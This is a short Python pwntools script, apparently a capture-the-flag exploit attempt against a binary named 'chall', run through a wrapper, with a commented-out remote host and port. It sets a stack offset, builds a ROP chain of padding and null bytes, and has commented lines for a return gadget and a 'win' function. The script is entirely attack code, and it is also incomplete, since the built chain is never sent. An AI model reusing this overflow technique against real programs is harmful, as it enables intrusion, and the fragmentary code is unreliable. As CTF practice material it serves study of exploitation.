from pwn import *

exe = context.binary = ELF("./chall")
# r = process()
# r = remote("34.45.81.67",16002)
r = process(["python3", "wrapper.py"])
offset = 280
rop = ROP(exe)
rop.raw(b"\x00")
# rop.raw(0x000000000040101a)
# rop.raw(exe.sym['win'])
# r.sendline("f" * 255)
rop.raw(b"A" * 250)
rop.raw(b"\x00\x00\x00\x00\n")
r.shutdown('send')

r.interactive()
